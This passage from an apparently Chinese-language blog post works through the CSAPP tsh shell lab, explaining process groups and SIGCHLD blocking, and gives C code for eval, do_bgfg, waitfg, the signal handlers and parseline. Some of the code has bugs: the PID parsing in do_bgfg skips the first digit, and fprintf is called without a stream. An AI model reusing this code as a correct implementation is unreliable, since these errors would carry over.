shell之上的,所以当kernel发出一个SIGINT之类的信号,Unix shell会将信号同时发送给tsh以及所有tsh创建的进程(因为tsh是当前shell的前台进程,shell的默认行为会将SIGINT信号发送给整个<code>前台进程组</code>),而我们想要实现的只是将信号发送给tsh的前台进程组.所以在fork子进程后,需要setpgid使得子进程的进程组与父进程独立.</p><blockquote><p>int setpgid(pid_t pid, pid_t pgid);<br>该函数可以用于将一个进程加入到指定的进程组中，或者创建一个新的进程组。具体的行为取决于 pid 参数的取值：<br>    1. 如果 pid 参数为 0，则表示将调用进程加入到与调用进程的PID相同的进程组中。<br>    2. 如果 pgid 参数为 0，则表示将 pid 指定的进程的进程组ID设置为其自身的PID。<br>    3. 如果 pgid 参数不为 0，则表示将 pid 指定的进程的进程组ID设置为 pgid。<br>    setpgid 函数的返回值为 0 表示成功，返回值为 -1 表示出现错误，此时可以通过查看 errno 变量来获取具体的错误信息。</p></blockquote><p>第二个:</p><blockquote><p>In eval, the parent must usesigprocmaskto block SIGCHLD signals before it forks the child,and then unblock these signals, again usingsigprocmaskafter it adds the child to the job list by calling addjob. Since children inherit the blocked vectors of their parents, the child must be sureto then unblock SIGCHLD signals before it execs the new program.6<br>    The parent needs to block theSIGCHLDsignals in this way in order to avoid the race condition wherethe child is reaped by sigchld handler(and thus removed from the job list) before the parent calls addjob.</p></blockquote><p>由于进程间执行顺序是不确定的,子进程在被fork之后在最极端的情况下可以一直执行到结束而父进程还刚从fork函数返回.也就是说,父进程一旦fork子进程,随时可能收到SIGCHLD信号(子进程随时可能暂停或终止).设想一下在父进程fork子进程后,addjob之前,子进程结束发出SIGCHLD信号,父进程捕获信号并在信号处理程序中deletejob删除一个不存在的job,这可能引发错误或被deletejob无视(取决于deletejob的实现),父进程从信号处理函数返回后再调用addjob则会将一个已经终止的进程加入任务列表中.这显然是错误的.所以需要在fork函数之前阻塞SIGCHLD信号,addjob后恢复.需要注意的是子进程会继承父进程的阻塞状态,所以需要在execve之前恢复阻塞.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment">//  * background children don't receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span>* argv[MAXARGS];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> state;</span><br><span class="line">    <span class="type">sigset_t</span> mask,prev;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;mask,SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parseline</span>(cmdline,argv))</span><br><span class="line">        state = BG;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        state = FG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">        <span class="keyword">if</span>((pid = <span class="built_in">Fork</span>())==<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">           <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">unix_error</span>(<span class="string">"setpgid error"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">unix_error</span>(<span class="string">"%s: command not found"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">addjob</span>(jobs,pid,state,cmdline);</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(state==FG)</span><br><span class="line">            <span class="built_in">waitfg</span>(pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>,<span class="built_in">pid2jid</span>(pid),pid,cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>)||!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"jobs"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="dofgbg"><a href="#dofgbg" class="headerlink" title="dofgbg"></a>dofgbg</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> jid;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'%'</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((jid = <span class="built_in">atoi</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]))&lt;=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobjid</span>(jobs,jid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, jid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((pid = <span class="built_in">atoi</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]))&lt;=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobpid</span>(jobs,pid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such process\n"</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>))</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-job-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill error"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>))</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-job-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill error"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"do_bgfg: Internal error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>我使用了和write up上不同的处理,具体见注释.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//根据write up上的描述,waitfg使用 use a busy loop around thesleepfunction.的方式实现</span></span><br><span class="line">    <span class="comment">// while(1)</span></span><br><span class="line">    <span class="comment">// {</span></span><br><span class="line">    <span class="comment">//     if(job-&gt;state==FG)</span></span><br><span class="line">    <span class="comment">//         sleep(1);</span></span><br><span class="line">    <span class="comment">//     else</span></span><br><span class="line">    <span class="comment">//         break;</span></span><br><span class="line">    <span class="comment">// }</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//但CSAPP书上提到这种方法执行太慢,故采用sigsuspend函数</span></span><br><span class="line">    <span class="type">sigset_t</span> mask,prev;</span><br><span class="line">    <span class="comment">//获取当前set存入prev</span></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state==FG)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sigsuspend</span>(&amp;prev);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>注意Linux的显式信号阻塞可能丢弃掉一部分SIGCHLD信号,所以在sigchld_handler函数的一次调用中需要尽可能多的回收子进程.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn't wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> jid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigchld_handler: entering"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>,&amp;status,WNOHANG|WUNTRACED))&gt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobpid</span>(jobs,pid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="string">"Lost track of (%d)\n"</span>,pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">WIFSTOPPED</span>(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>,jid,job-&gt;pid,<span class="built_in">WSTOPSIG</span>(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">WIFEXITED</span>(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">deletejob</span>(jobs,pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) deleted\n"</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n"</span>, jid, pid, <span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">deletejob</span>(jobs,pid))</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(verbose)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) deleted\n"</span>, jid, pid);</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, jid, pid, <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigchld_handler: exiting"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sigint-handler、sigtstp-handler"><a href="#sigint-handler、sigtstp-handler" class="headerlink" title="sigint_handler、sigtstp_handler"></a>sigint_handler、sigtstp_handler</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigint_handler: entering"</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid){</span><br><span class="line">        <span class="comment">//pid设置为负,将信号发送给整个进程组.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill (sigint) error"</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"sigint_handler: Job (%d) killed\n"</span>, pid);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigint_handler: exiting"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigstp_handler: entering"</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//pid设置为负,将信号发送给整个进程组.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-pid,SIGTSTP)&lt;<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill (tstp) error"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(verbose){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"sigstp_handler: Job [%d] (%d) stopped\n"</span>, job-&gt;jid, pid);</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigstp_handler: exiting"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="parseline"><a href="#parseline" class="headerlink" title="parseline"></a>parseline</h3><p>lab直接给出的,学一下实现.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> array[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="type">char</span> *buf = array;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="type">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="type">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span 